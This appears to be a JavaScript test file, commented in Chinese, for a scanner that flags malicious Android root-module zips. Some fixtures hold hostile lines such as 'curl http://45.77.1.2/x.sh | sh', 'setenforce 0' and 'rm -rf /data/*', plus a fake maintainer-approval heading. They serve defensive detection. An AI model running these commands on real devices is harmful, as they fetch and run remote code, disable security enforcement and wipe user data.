test('端到端：META-INF 安装期入口里的恶意代码会被扫到（此前这类文件一行都没读）', () => {
  assert.ok(FLASH_ENTRY_POINTS.includes('META-INF/com/google/android/updater-script'));
  const p = writeZip('handler.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'META-INF/com/google/android/updater-script', content: '#!/system/bin/sh\nsetenforce 0\nrm -rf /data/*\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  const ids = new Set(r.findings.map((f) => f.ruleId));
  assert.ok(ids.has('SELINUX_DISABLE') && ids.has('RM_RF_MUTABLE'), JSON.stringify([...ids]));
  const hit = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.equal(hit.file, 'META-INF/com/google/android/updater-script');
  assert.equal(r.inventory.handlers.length, 1, '入口文件要在清单里单独成类，便于人工定位');
});

test('端到端：.lua / .js / .prop 里的危险模式同样纳入行级规则', () => {
  const p = writeZip('langs.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'service.lua', content: 'os.execute("setenforce 0")\n' },
    { name: 'hook.js', content: 'var s = "curl http://45.77.12.9/x | sh";\n' },
    { name: 'system.prop', content: 'ro.x.url=http://payload.xyz/c\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const files = new Set(r.findings.map((f) => f.file));
  for (const need of ['service.lua', 'hook.js', 'system.prop']) {
    assert.ok(files.has(need), `${need} 应产生发现；实际 ${[...files].join(',')}`);
  }
  assert.ok(SEVERITY_ORDER[r.riskLevel] >= SEVERITY_ORDER.medium);
});

test('端到端：把 ELF 改名成 config.js 也只能落到「二进制」，不会当成脚本放过', () => {
  const elf = Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.alloc(200, 0)]);
  const p = writeZip('disguise.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'config.js', content: elf },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.notEqual(r.riskLevel, 'low', '二进制负载不应判 low');
  assert.equal(r.decision.needsHumanReview, true);
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_BINARY' && f.file === 'config.js'),
    JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.deepEqual(r.binaries.map((b) => b.name), ['config.js']);
  assert.ok(!r.scripts.some((s) => s.name === 'config.js'), '机器码不进「全文」一节，否则 PR 评论会被灌满');

  // 评审 fix1-③：上面那句「不进全文」只是因为没人引用才没红 —— 它压根不在扫描面里。
  // 真被 sh 引用时它必须进扫描面（该扫的照扫），但渲染面只许给有界预览：删掉渲染守卫这条就红。
  const p2 = writeZip('disguise-referenced.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: '#!/system/bin/sh\nsh $MODDIR/config.js\n' },
    { name: 'config.js', content: elf },
  ]);
  const r2 = scanZip(p2, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.deepEqual(r2.escalated.map((e) => e.resolvedEntry), ['config.js'], '被引用就要进扫描面');
  const row2 = r2.scripts.find((s) => s.name === 'config.js');
  assert.ok(row2, '升级条目要在人看得见的清单里（F11）');
  assert.equal(row2.nonText, true, '非文本要标出来');
  assert.equal(row2.contentKind, 'non-text-preview', '预览要说明它不是全文');
  const NUL = String.fromCharCode(0);
  assert.ok(!row2.content.includes(NUL), '机器码不进全文 —— 删掉渲染守卫这一句就红');
  assert.ok(row2.content.length < 1000, '必须是有限预览，实际 ' + row2.content.length + ' 字符');
  assert.ok(!renderMarkdown(r2).includes(NUL), 'md 里也不许有 NUL');
  assert.equal(r2.riskLevel, 'high', '改名成 .js 的 ELF 被引用时必须 high');
});

test('端到端：payload 藏在 512 KB 之后照样被行级规则命中，同时报覆盖度缺口', () => {
  const filler = '# 填充行，用于把危险语句推到报告内嵌上限之外\n'.repeat(1 + Math.ceil(MAX_TEXT / 60));
  const body = filler + '\nsetenforce 0\n';
  const p = writeZip('late-payload.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: body },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const big = r.inventory.canonicalScripts.find((s) => s.name === 'customize.sh');
  assert.ok(big.bytes > MAX_TEXT, `样本必须超过内嵌上限，实际 ${big.bytes}`);
  assert.equal(big.truncated, true);
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.ok(sel, '规则必须跑全文：藏在尾部的 setenforce 不能因为报告截断而漏掉');
  assert.ok(sel.line > 1000, `命中的是尾部行，实际第 ${sel && sel.line} 行`);
  assert.equal(r.riskLevel, 'high');
  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED'), '看不全本身也要报，挡住自动放行');
  assert.match(renderMarkdown(r), /包结构与审核覆盖度/);
  assert.match(renderMarkdown(r), /报告只内嵌前/);
});

test('端到端：声明解压 1 GB 的条目按 zip bomb 拦下', () => {
  const p = writeZip('bomb.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'z', content: 'x', method: 0, declaredOrig: 1024 * 1024 * 1024 },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const ids = new Set(r.findings.map((f) => f.ruleId));
  assert.ok(ids.has('STRUCT_ZIP_BOMB'), JSON.stringify([...ids]));
  assert.ok(ids.has('STRUCT_RATIO'), JSON.stringify([...ids]));
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  assert.ok(r.structure.totalUncompressed >= 1024 * 1024 * 1024, String(r.structure.totalUncompressed));
});

test('端到端：主动挡下的超大条目不能再交给系统 unzip 试一遍', () => {
  // 唯一的条目超限 -> files 为空。若不加 deliberate 判断，这里会去调外部 unzip，
  // 等于把刚拦住的超大条目重新解压一次（runner 当场被打满的就是这一步）。
  const p = writeZip('over-limit.zip', [
    { name: 'blob', content: Buffer.alloc(2 * 1024 * 1024, 0x41) },
  ]);
  const r = scanZip(p, { changeType: 'first', maxEntryBytes: 64 * 1024 });
  assert.equal(r.reader, 'builtin', '不许回退');
  assert.equal(r.unread.length, 1);
  assert.equal(r.unread[0].overLimit, true);
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_UNREADABLE'));
  assert.notEqual(r.riskLevel, 'low');
});

test('端到端：声明说谎（说 10 B 实际 2 MB）时，解压硬上限是唯一还管用的闸', () => {
  const big = Buffer.alloc(2 * 1024 * 1024, 0x41);
  const p = writeZip('lying.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'blob', content: big, declaredOrig: 10 },
  ]);
  // 先证明：不做隔离时这个条目本来能正常读出来，问题只在超上限
  const wide = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(wide.files === undefined || wide.unread.length === 0, JSON.stringify(wide.unread));

  const tight = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first', maxEntryBytes: 64 * 1024 });
  assert.equal(tight.reader, 'builtin');
  assert.equal(tight.unread.length, 1, JSON.stringify(tight.unread));
  assert.equal(tight.unread[0].name, 'blob');
  assert.equal(tight.unread[0].overLimit, true, '必须归因为「超上限」，而不是笼统的解压失败');
  assert.match(tight.unread[0].reason, /上限/);
  assert.ok(tight.findings.some((f) => f.ruleId === 'STRUCT_UNREADABLE'));
  assert.notEqual(tight.riskLevel, 'low', '读不到不等于干净');
  assert.equal(tight.structure.limits.MAX_ENTRY_UNCOMPRESSED, 64 * 1024, '报告里写的上限必须就是这次生效的上限');
});

test('端到端：系统 unzip 回退通道看不到结构属性，因此不予自动放行', () => {
  // 直接验回退路径的定级语义：reader=unzip 时必须自带 AUDIT_COVERAGE_METADATA。
  // 构造一个内置解析器读不出的文件（EOCD 被截断）来触发回退，
  // 若本机没有 unzip 就跳过 —— 这条断言依赖外部命令，不该因此把测试变成不稳定测试。
  const dir = mkdtempSync(join(tmpdir(), 'modaudit-'));
  const p = join(dir, 'broken.zip');
  const good = buildZip([{ name: 'module.prop', content: CLEAN_PROP }]);
  writeFileSync(p, good.subarray(0, good.length - 10)); // 破坏 EOCD
  let r;
  try {
    r = scanZip(p, { changeType: 'first' });
  } catch (err) {
    assert.match(String(err.message), /unzip/, '回退失败只可能是本机没有 unzip');
    return;
  }
  assert.equal(r.reader, 'unzip');
  assert.ok(r.findings.some((f) => f.ruleId === 'AUDIT_COVERAGE_METADATA'), JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(r.decision.needsHumanReview, true);
});

test('readZip 带出 entries 元数据与 head，供结构/二进制判断使用', () => {
  const p = writeZip('meta.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'link', content: '/system/bin/sh', extAttr: 0xa1ff0000 },
  ]);
  const { files, entries, unread } = readZip(p);
  assert.equal(unread.length, 0);
  assert.equal(entries.length, 2);
  assert.equal(entries.find((e) => e.name === 'link').isSymlink, true);
  assert.equal(entries.find((e) => e.name === 'module.prop').isSymlink, false);
  assert.deepEqual([...files.find((f) => f.name === 'module.prop').head.subarray(0, 3)], [0x69, 0x64, 0x3d], 'head 是解压后的字节，不是压缩流');
});

// ---------------------------------------------------------------------------
// ⑦ 载荷间接执行 —— 被引用但未纳入扫描的包内条目（T1）
// ---------------------------------------------------------------------------

test('EXEC_BUNDLED_FILE：脚本执行包内非扫描面条目 → high，且那个条目被拉进内容扫描', async () => {
  const zip = makeModuleZip({ id: 'eval.t1', files: [
    ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1/stage.dat\n'],
    ['stage.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
  assert.equal(r.riskLevel, 'high');                      // 之前是 low → auto-approve
  assert.equal(r.decision.action, 'block');
  // 关键：不只是标个链接，被引用的条目真的被扫了
  assert.ok(ids.includes('PIPE_TO_SHELL'), '被引用条目必须按文本再扫一遍');
  const f = r.findings.find((x) => x.ruleId === 'PIPE_TO_SHELL');
  assert.equal(f.file, 'stage.dat');
  // F11：它还得在人看得见的清单里，否则 T5 的 brief 与人工复核都读不到这段内容
  assert.ok(r.scripts.some((s) => s.name === 'stage.dat'), '被升级的条目必须进 report.scripts');
});

test('EXEC_BUNDLED_FILE：引用形态矩阵 —— 检测层要认得全部写法，包括改名机器码与同行复合', () => {
  // 这一条只管「检测」：规则是纯逐行函数，拿不到扫描面，所以它不该替「那个文件是否已被扫过」说话。
  // 「目标已逐行扫过就不报」的撤销判据在 scanZip 里（见下面那条端到端用例）—— 评审 fix1-① 的修法。
  for (const line of [
    // 简报 Step 1 的 6 例
    'sh $MODDIR/x.dat', 'bash ${MODDIR}/payload', '. $MODDIR/lib.sh.bin',
    'busybox sh $MODDIR/x.bin', 'source ${MODPATH}/run.zsh', 'sh "/data/adb/modules/a/payload.bin"',
    // 简报 Step 3 注释点名要认的 3 例
    'sh $TMPMODDIR/stage2.dat', 'sh $MODPATH/bin/payload', 'sh /data/adb/modules/eval.t1/stage.dat',
    // fix1-①：改名成脚本后缀的机器码。后缀不是「已扫过」的证据，所以这里必须命中。
    'sh $MODDIR/payload.js', 'sh $MODDIR/payload.sh', 'sh $MODPATH/late.js',
    'sh $MODDIR/cfg.prop', 'busybox sh ${MODDIR}/hook.lua',
    // fix1-②：同一行不许自我豁免（两个引用一个合法一个恶意，恶意那个必须报）
    'sh $MODDIR/payload.dat && sh $MODDIR/install.sh',
    'sh $MODDIR/install.sh && sh $MODDIR/payload.dat',
    'sh $MODDIR/payload.dat  # 这行只是调用 install.sh 的包装',
    // fix1-④：一律不许豁免的逃逸写法
    'echo hi sh $MODDIR/x.bin', '. $MODDIR/functions', "sh '$MODDIR/lib.dat'",
    'sh${IFS}$MODDIR/x.bin', '$MODDIR/tool.bin', '  "$MODDIR/tool.bin" --help',
    'do_thing || $MODDIR/stage2.bin', 'cd /; sh $MODDIR/x.bin',
    // fix1-⑤：要归一化的形状，先得能被检测
    'sh $MODDIR//x.dat', 'sh $MODDIR/sub/../x.dat', 'sh $MODDIR/sub/./x.dat',
    'sh $MODDIR\\sub\\x.dat', 'sh $MODDIR/X.DAT', 'sh $MODDIR/ghost.dat',
  ]) {
    assert.ok(EXEC_BUNDLED_FILE.scan('service.sh', line).length > 0, line);
  }
  // 不是「执行包内另一个文件」的形状，以及注释行（fix1-④ 的豁免，按本仓 /^\s*#/ 先例）
  for (const line of [
    'sh /system/bin/foo', 'echo $MODPATH/x', 'cp -f busybox $MODPATH/system/xbin/bb',
    'rm -rf $MODDIR/system/app/Foo', 'export PATH=$MODDIR/bin:$PATH',
    '[ -f $MODDIR/data.dat ] && echo ok', 'SKIPUNINSTALL=1', '# sh $MODDIR/tool.bin',
    '  #  sh $MODDIR/tool.bin', '#!/system/bin/sh',
  ]) {
    assert.equal(EXEC_BUNDLED_FILE.scan('service.sh', line).length, 0, line);
  }
});

test('EXEC_BUNDLED_FILE：撤销判据是「它真的在扫描面里」，不是后缀像不像脚本', async () => {
  // 正经模块的常规写法：install.sh 确实被逐行扫过 -> 这条 high 撤掉，别淹没人工队列。
  const ok = makeModuleZip({ id: 'eval.t1ok', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/install.sh\nbash ${MODDIR}/lib.sh\n'],
    ['install.sh', 'echo install\n'],
    ['lib.sh', 'echo lib\n'],
  ]});
  const r1 = await scanToReport(ok, { changeType: 'first' });
  assert.deepEqual(r1.escalated, [], '目标已在扫描面里，不该被当成新条目升级');
  assert.ok(!r1.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    JSON.stringify(r1.findings.map((f) => f.ruleId)));
  assert.equal(r1.riskLevel, 'low', JSON.stringify(r1.findings));
  assert.equal(r1.decision.action, 'auto-approve', '多文件正经模块不能被这条规则抬成人工队列');

  // 同一个形状，但那个 .sh 不在包里（运行期才写出来）：解析不到 -> 照报 high，且不许承诺读过
  const ghost = makeModuleZip({ id: 'eval.t1ghost', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/install.sh\n'],
  ]});
  const r2 = await scanToReport(ghost, { changeType: 'first' });
  assert.ok(r2.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    '包内不存在的引用仍然要人工读（fail-closed：多拦可申诉）');
  assert.equal(r2.riskLevel, 'high');

  // 后缀是 .sh 但内容是机器码（魔数赢过后缀）-> 它其实不在扫描面里 -> 必须报、必须升级
  const renamed = makeModuleZip({ id: 'eval.t1ren', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/install.sh\n'],
    ['install.sh', Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'),
      Buffer.from([0, 0]), Buffer.from('setenforce 0\n', 'utf8'), Buffer.alloc(200, 0)])],
  ]});
  const r3 = await scanToReport(renamed, { changeType: 'first' });
  assert.deepEqual(r3.escalated.map((e) => e.resolvedEntry), ['install.sh'],
    '同一个后缀，另一条假设（已扫过）不成立时必须升级');
  assert.ok(r3.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'));
  assert.equal(r3.riskLevel, 'high');
});

test('EXEC_BUNDLED_FILE：规则要接进规则表、分类有中文标签、且 high 参与定级', () => {
  assert.ok(CONTENT_RULES.some((r) => r.id === 'EXEC_BUNDLED_FILE'),
    '不进 CONTENT_RULES 的话 scanContent 根本不会跑它，端到端等于没这条规则');
  assert.equal(RULES_BY_ID.EXEC_BUNDLED_FILE, EXEC_BUNDLED_FILE);
  assert.equal(EXEC_BUNDLED_FILE.severity, 'high');
  assert.equal(EXEC_BUNDLED_FILE.category, 'execution');
  const [f] = EXEC_BUNDLED_FILE.scan('service.sh', 'sh $MODDIR/x.dat');
  assert.equal(f.severity, 'high');
  assert.equal(f.ruleId, 'EXEC_BUNDLED_FILE');
  assert.equal(f.file, 'service.sh');
  assert.equal(f.line, 1);
  assert.equal(countsTowardRisk(f), true, 'high 必须参与定级，不能只提示');
});

test('resolveBundledTargets：只认包内真实存在、大小写原样、且不在扫描面里的条目', () => {
  const files = [
    { name: 'service.sh', content: '#!/system/bin/sh\nsh $MODDIR/x.dat\n' },
    { name: 'x.dat', content: 'echo one\n' },
    { name: 'X.DAT', content: 'echo case\n' },          // 大小写不同的另一份，不许被 fuzzy 命中
    { name: 'bin/y.dat', content: 'echo two\n' },       // 子目录相对路径
    { name: 'ghost.ref', content: 'sh $MODDIR/not-in-zip.dat\n' },
  ];
  const targets = [files[0]];
  const got = resolveBundledTargets(targets, files, 'eval.t1');
  assert.deepEqual(got.map((e) => e.name), ['x.dat'], '只返回包内存在且未被扫描的那一条');
  assert.equal(got[0].__from, 'service.sh', '要能指出是谁引用了它');
  assert.equal(got[0].__line, 2, '行号是引用行的行号，不是文件行号');
  assert.equal(got[0].__ref, 'sh $MODDIR/x.dat', '引用原文要留在报告里供人工复验');
  assert.equal(got[0].content, 'echo one\n', '升级条目必须带着内容，否则下面扫不到');

  // 已在扫描面里的不重复追加
  assert.deepEqual(resolveBundledTargets([targets[0], files[1]], files, 'eval.t1'), [],
    '已在扫描面里的条目不再取一次，否则同一份内容被扫两遍');
  // 「文本后缀就不再升级」这条旧判据已被评审 fix1-① 否掉：后缀不代表已扫过。
  // 换成看扫描面成员 —— helper.sh 真在扫描面里时不重复取，不在时（例如它是改名成 .sh 的机器码，
  // classify 把它落到 binaries）必须取进来。
  const realTargets = [{ name: 'service.sh', content: 'sh $MODDIR/helper.sh\n' },
    { name: 'helper.sh', content: 'rm -rf /data/*\n' }];
  assert.deepEqual(resolveBundledTargets(realTargets, realTargets, 'm').map((e) => e.name), [],
    '已在扫描面里的 .sh 不再取一次，否则同一份内容被扫两遍');
  const disguisedTargets = [{ name: 'service.sh', content: 'sh $MODDIR/helper.sh\n' }];
  const disguisedFiles = [...disguisedTargets, { name: 'helper.sh', content: 'rm -rf /data/*\n' }];
  assert.deepEqual(resolveBundledTargets(disguisedTargets, disguisedFiles, 'm').map((e) => e.name),
    ['helper.sh'], '后缀是 .sh 但确实不在扫描面里时，它就没被逐行扫过 —— 必须升级');
  // 指向别的模块目录的绝对路径不算包内条目
  const other = [{ name: 'service.sh', content: 'sh /data/adb/modules/other_mod/x.dat\n' }];
  assert.deepEqual(resolveBundledTargets(other, files, 'eval.t1'), [],
    '模块 id 不匹配时不许把 /data/adb/modules/<别的 id>/ 折进本包');
  // 引用了包内不存在的文件：不升级（那条引用由行级规则自己报）
  const ghost = [{ name: 'ghost.ref', content: files[4].content }];
  assert.deepEqual(resolveBundledTargets(ghost, files, 'eval.t1'), []);
  // 只递归一层：x.dat 自己的引用不再追随（防环，也把链路长度钉死在报告可读的范围）
  const chained = [
    { name: 'service.sh', content: 'sh $MODDIR/x.dat\n' },
    { name: 'x.dat', content: 'sh $MODDIR/bin/y.dat\n' },
    { name: 'bin/y.dat', content: 'echo deep\n' },
  ];
  assert.deepEqual(resolveBundledTargets([chained[0], chained[1]], chained, 'm').map((e) => e.name), ['bin/y.dat'],
    '一层升级：只从初始扫描面出发');
  assert.deepEqual(resolveBundledTargets([chained[0]], chained, 'm').map((e) => e.name), ['x.dat'],
    '从 service.sh 出发只到 x.dat，不再往下追');
});

test('端到端：被 sh 引用的伪装二进制照样进扫描面（这条压过「像不像文本」）', async () => {
  // 硬要求 3：载荷填成二进制样躲过文本判定是现成的逃逸阀，所以「被引用」这件事本身就够纳入。
  const zip = makeModuleZip({ id: 'eval.t1b', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.bin\n'],
    ['payload.bin', Buffer.concat([Buffer.from('setenforce 0\n', 'utf8'), Buffer.from([0x00]),
      Buffer.from('curl http://45.77.1.2/x.sh | sh\n', 'utf8')])],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.ok(r.binaries.some((b) => b.name === 'payload.bin'), '它确实先被 classify 认成二进制，才谈得上升级');
  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.bin']);
  assert.equal(r.escalated[0].fromFile, 'service.sh');
  assert.equal(r.escalated[0].fromLine, 2);
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.ok(sel, '升级之后要真的按文本逐行扫过');
  assert.equal(sel.file, 'payload.bin');
  assert.equal(sel.line, 1);
  assert.ok(r.scripts.some((s) => s.name === 'payload.bin'), '升级条目要出现在人看得见的全文里');
  assert.ok(r.inventory.escalated.some((e) => e.name === 'payload.bin'), '也要出现在清单里');
  assert.equal(r.riskLevel, 'high');
});

test('端到端：引用的路径不在包内时不升级，但引用行本身照样报 high', async () => {
  // 分工：行级规则只管「脚本执行了模块目录里的另一个文件」，升级只认真实存在的条目。
  const zip = makeModuleZip({ id: 'eval.t1c', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/ghost.dat\n'],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.deepEqual(r.escalated, [], '包内没有 ghost.dat，无内容可拉进扫描面');
  assert.deepEqual(r.inventory.escalated, []);
  assert.ok(!r.scripts.some((s) => s.name === 'ghost.dat'));
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
  assert.equal(r.riskLevel, 'high', '运行期才出现的可执行目标同样要人工读');
});

test('端到端：升级链路在报告里看得见（escalated + inventory + Markdown 引用链）', async () => {
  const zip = makeModuleZip({ id: 'eval.t1d', files: [
    ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1d/stage.dat\n'],
    ['stage.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.deepEqual(r.escalated, [
    { fromFile: 'service.sh', fromLine: 2, ref: 'sh /data/adb/modules/eval.t1d/stage.dat', resolvedEntry: 'stage.dat' },
  ]);
  assert.deepEqual(r.inventory.escalated.map((e) => [e.name, e.fromFile, e.fromLine]), [['stage.dat', 'service.sh', 2]]);
  // 升级过的条目不再出现在「未纳入行级扫描的数据文件」里 —— 它已经被扫了
  assert.ok(!r.inventory.otherFiles.includes('stage.dat'), JSON.stringify(r.inventory.otherFiles));
  const md = renderMarkdown(r);
  assert.match(md, /被脚本引用而\*\*升级进扫描面\*\*的条目/);
  assert.match(md, /stage\.dat/);
  assert.ok(md.includes('| 被引用升级（原本不在扫描面） | `stage.dat` |'), '文件清单表里也要有它一行');
  assert.match(md, /`service\.sh:2`/);
  assert.match(md, /## 脚本全文[\s\S]*curl http:\/\/45\.77\.1\.2\/x\.sh \| sh/);
  const j = JSON.parse(renderJSON(r));
  assert.deepEqual(j.escalated, r.escalated, 'escalated 是报告字段，不是 finding，JSON 里原样保留');
});

/** ELF 头 + 埋一行明文给行级规则读 + 补零：魔数是机器码，名字随用例挑 */
function elfWith(text, pad = 200) {
  return Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.from([0, 0]),
    Buffer.from(text, 'utf8'), Buffer.alloc(pad, 0)]);
}

/**
 * 按 CommonMark/GitHub 语义走一遍 Markdown，返回落在代码围栏「之外」的标题行。
 * 开栏长度 n，只有整行反引号数 >= n 才闭栏 —— 围栏体内的一切都不参与渲染。
 */
function headingsOutsideFence(md) {
  let fence = 0;
  const out = [];
  for (const line of String(md).split(/\r?\n/)) {
    const m = line.match(/^ {0,3}(`{3,})([^`]*)$/);
    if (m) {
      if (fence === 0) fence = m[1].length;
      else if (m[1].length >= fence) fence = 0;
      continue;
    }
    if (fence === 0 && /^#{1,6}\s/.test(line)) out.push(line);
  }
  return out;
}

test('fix1-①：改名成 .js / .sh 的 ELF 被 sh 引用时闸不再静默失效（升级 + 逐行扫 + high）', async () => {
  for (const name of ['payload.js', 'payload.sh']) {
    const zip = makeModuleZip({ id: 'eval.h1', files: [
      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/' + name + '\n'],
      [name, elfWith('setenforce 0\n')],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    const ids = r.findings.map((f) => f.ruleId);
    assert.ok(r.binaries.some((b) => b.name === name), 'classify 认它是二进制（魔数赢过后缀）');
    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [name], '评审实测 escalated 曾是 []');
    const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
    assert.ok(sel, '该内容必须进行级扫描（评审实测一行都没扫）');
    assert.equal(sel.file, name);
    assert.equal(sel.line, 1);
    assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
    assert.equal(r.riskLevel, 'high', '评审实测这里曾只有 medium');
    assert.equal(r.decision.action, 'block');
  }
});

test('fix1-②：同一行不许自我豁免 —— 两个引用一个合法一个恶意，恶意那个必须报', async () => {
  for (const ref of [
    'sh $MODDIR/payload.dat && sh $MODDIR/install.sh',
    'sh $MODDIR/install.sh && sh $MODDIR/payload.dat',
    'sh $MODDIR/payload.dat  # 这行只是调用 install.sh 的包装',
  ]) {
    const zip = makeModuleZip({ id: 'eval.h2', files: [
      ['service.sh', '#!/system/bin/sh\n' + ref + '\n'],
      ['install.sh', 'echo install\n'],
      ['payload.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    const ids = r.findings.map((f) => f.ruleId);
    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.dat'], ref);
    assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ref);
    assert.ok(ids.includes('PIPE_TO_SHELL'), '载荷必须按文本再扫一遍');
    assert.equal(r.findings.find((f) => f.ruleId === 'PIPE_TO_SHELL').file, 'payload.dat');
    assert.equal(r.riskLevel, 'high', ref + ' —— 评审实测曾是 0 命中 / low');
    // install.sh 已被逐行扫过，不该由它说话：snippet 要指向真正没被扫过的载荷
    assert.match(r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE').snippet, /payload\.dat/);
  }
});

test('fix1-③：升级进来的非文本条目只给有界预览，机器码不进全文与产物', async () => {
  const blob = Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.alloc(1024 * 1024, 0)]);
  const zip = makeModuleZip({ id: 'eval.h3', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.conf\n'],
    ['payload.conf', blob],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.conf'],
    '扫描面与渲染面分开：不许为了渲染方便把它退回名单外');
  const row = r.scripts.find((s) => s.name === 'payload.conf');
  assert.ok(row, '它还得在人看得见的清单里（F11）');
  assert.equal(row.nonText, true);
  assert.equal(row.contentKind, 'non-text-preview');
  assert.ok(row.nulCount > 100000, '预览要报出 NUL 个数，实际 ' + row.nulCount);
  assert.ok(!row.content.includes('\u0000'), '正文里不许有 NUL');
  assert.ok(row.content.length < 1000, '必须是有限预览，实际 ' + row.content.length + ' 字符');
  assert.match(row.content, /内容非文本/);
  assert.match(row.content, /7f 45 4c 46/);
  const md = renderMarkdown(r);
  const json = renderJSON(r);
  assert.ok(Buffer.byteLength(md) < 32 * 1024, 'md 曾被灌成 1.03 MB，实际 ' + Buffer.byteLength(md) + ' B');
  assert.ok(!md.includes('\u0000'), 'md 曾被灌成 52 万个 NUL');
  assert.ok(Buffer.byteLength(json) < 64 * 1024, 'json 曾被灌成 50 MB，实际 ' + Buffer.byteLength(json) + ' B');
  assert.match(md, /非文本：只给有界预览/);
});

test('fix1-③：围栏体里的反引号关不掉公开评论的围栏 —— 投稿者写的假标题不外漏', async () => {
  const evil = '#!/system/bin/sh\nsh $MODDIR/tool.bin\n```\n\n## 已由维护者批准 ✅\n\n无需人工复核\n````\n';
  const zip = makeModuleZip({ id: 'eval.h3b', files: [
    ['service.sh', evil],
    ['tool.bin', elfWith('setenforce 0\n')],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  const md = renderMarkdown(r);
  const outside = headingsOutsideFence(md);
  assert.ok(!outside.some((l) => l.includes('已由维护者批准')),
    '注入的假标题被当成报告自己的标题渲染了：' + JSON.stringify(outside.slice(0, 8)));
  // 开栏/闭栏的长度要压过正文里最长的反引号串（这里是 4 个），否则正文的 ``` 能提前闭栏
  const opener = md.match(/^(`{3,})sh$/m);
  assert.ok(opener, '「脚本全文」一节要有以 sh 标注的开栏');
  assert.ok(opener[1].length > 4,
    '开栏长度必须压过正文里最长的反引号串，实际 ' + opener[1].length + ' 个');
  assert.ok(md.includes('## 已由维护者批准'), '显示层防护不许吃掉原文（人工要看的就是原文）');
});

test('fix1-④：注释行豁免；echo / source / 单引号 / ${IFS} / 直接执行一律不许豁免', async () => {
  // 注释里的引用不是执行 —— 按本仓 /^\s*#/ 的既有先例不报 high（评审实测它曾报 high，是误伤）。
  const commented = makeModuleZip({ id: 'eval.h4a', files: [
    ['service.sh', '#!/system/bin/sh\n# sh $MODDIR/notes.dat\nexit 0\n'],
    ['notes.dat', 'echo documented\n'],
  ]});
  const a = await scanToReport(commented, { changeType: 'first' });
  assert.ok(!a.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    JSON.stringify(a.findings.map((f) => f.ruleId)));
